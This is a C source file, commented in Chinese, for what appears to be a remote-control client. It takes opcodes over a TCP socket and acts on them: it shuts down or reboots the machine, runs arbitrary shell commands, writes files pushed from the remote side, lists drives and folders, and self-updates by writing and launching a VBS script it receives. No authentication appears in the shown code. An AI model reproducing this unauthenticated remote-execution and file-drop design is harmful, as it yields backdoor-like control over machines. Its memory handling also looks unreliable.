#include "PublicHead.h"
void* NewProcess(void * p){
    char *Process=(char *)p;
    //printf("p:%d\n",p);
    printf("Process:%s\n",Process);
    system(Process);
    return 0;
}

void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
    //for(int i=0;i<Datalen;i++){printf("%02x,",Order[i]);}printf("\n");

    int Translen;
    char * Buffer;
    FILE *fp;
    switch(Order[0]){//大类区分
        case 0x00://系统操作类
            switch(Order[1]){
                case 0x00://关机
                    system("shutdown -p");
                    break;
                case 0x01://重启
                    system("shutdown -r -t 0");
                    break;
                    //02保留为开机指令
                    //03为睡眠
                case 0x04://休眠
                    system("shutdown -h");
                    break;
                case 0x06://执行cmd无返回值
                    //printf("Order.0x06:%s\n",Order+2);
                    system(Order+2);
                    break;
                case 0x07://执行cmd有返回值
                    break;
                case 0x08://打开一个新进程执行CMD
                    //printf("OrderAddr:%d\n",Order);
                    //printf("Order+2:%s\n",Order+2);
                    pthread_create(NULL, NULL, NewProcess, Order+2);
                    Sleep(100);//此处睡眠为了内存不那么快被回收
                    break;
                case 0x09://执行连续命令,先打开cmd，但无返回值
                    break;

            }
            break;
        case 0x01://文件操作类
            switch(Order[1]){
                case 0x00://上传文件到客户机
                    fp = fopen(Order+2, "wb");//传入文件名
                    Translen=0;
                    //unsigned long long int Nowlen=0;
                    //printf("ret:%d",ret);
                    memcpy(&Translen,Order+Datalen-8,8);
                    //for(int i=0;i<ret;i++){printf("%02x,",revData[i]);}printf("\n");
                    //printf("Translen:%d\n",Translen);
                    //printf("Fresh.Translen:%I64u\n",Translen);
                    Buffer = (char *)malloc(1024);
                    send(TCPSocket, "0", 1, 0);
                    while(true){
                        Datalen = recv(TCPSocket, Buffer, 1024, 0);
                        //printf("ret:%d\n",ret);
                        fwrite(Buffer, Datalen, 1, fp);
                        Translen-=Datalen;
                        //if(ret!=512){
                        //    printf("ret:%d\n",ret);
                        //    printf("Translen:%d,Nowlen:%d\n",Translen,Nowlen);
                        //}
                        // printf("Translen:%d\n",Translen);
                        //printf("Translen:%I64u\n",Translen);
                        if(Translen < 1){
                            //printf("Normal Break");
                            break;
                        }
                    }
                    free(Buffer);
                    fclose(fp);
                    break;
                case 0x01://从客户机下载文件
                    break;
                case 0x02://列出文件列表
                    if(Datalen == 2){
                        //printf("GetDrivers");
                        Buffer = GetDrivers();

                    }else{
                        //printf("GetFolders");
                        Buffer = GetFileList(Order+2);
                    }
                    //for(int i=0;i<(unsigned char)FileList[0]+((unsigned char)FileList[1]<<8)+((unsigned char)FileList[2]<<16)+((unsigned char)FileList[3]<<24);i++){printf("%02hx,",FileList[i]);}printf("\n");
                    Order -= 8;//传入地址做过处理，所以此处需要使其回到原地址
                    free(Order);
                    Datalen = (unsigned char)Buffer[0]+((unsigned char)Buffer[1]<<8)+((unsigned char)Buffer[2]<<16)+((unsigned char)Buffer[3]<<24)-4;
                    //printf("ret:%d\n",ret);
                    //printf("OrderAddr_In:%d\n",Order);
                    if(Datalen>2048){
                        Order =  (char *)malloc(Datalen);
                    }else{
                        Order =  (char *)malloc(2048);
                    }
                    //printf("ret:%d\n",ret);
                    data_compress((unsigned char *)(Buffer+4),Datalen,(unsigned char *)Order, &Datalen);
                    //printf("ret:%d\n",ret);
                    free(Buffer);

                    //printf("ALlLen:%d\n",(unsigned char)FileList[0]);//+(FileList[1]<<8)+(FileList[2]<<16)+(FileList[3]<<24)
                    //for(int i=0;i<8;i++){printf("%02hx,",FileList[i]);}printf("\n");
                    //printf("FileList[2]:%d\n",FileList[2]);
                    //printf("Datalen:%d",Datalen);
                    send(TCPSocket, Order, Datalen, 0);
                    Order += 8;
                    break;


            }
            break;
        case 0x02://自我操作类
            switch(Order[1]){
                case 0x00: //停止服务
                    exit(0);
                case 0x01: //自我更新
                    printf("OK0");
                    //将自己的配置信息复制给新的可执行文件
                    fp = fopen(Order+2,"r+b");
                    fseek(fp, -32, SEEK_END);
                    fwrite(Configs,1,32,fp);
                    fclose(fp);
                    printf("OK1");
                    //执行更新脚本
                    //printf("Scrpt:%s\n",);
                    //Buffer = (char *)malloc(12);
                    fp = fopen("Update.vbs","w");
                    fseek(fp, -32, SEEK_END);
                    fwrite(Order + strlen(Order+2) + 3,1,strlen(Order + strlen(Order+2) + 3),fp);
                    fclose(fp);
                    printf("OK2");
                    pthread_create(NULL, NULL, NewProcess, (char *)"start Update.vbs");
                    Sleep(100);
                    printf("OK3");
                    exit(0);
                    break;
            }
            break;
    }

    //printf("free\n");
    free(Order-8);
    //printf("freeOK\n");
}
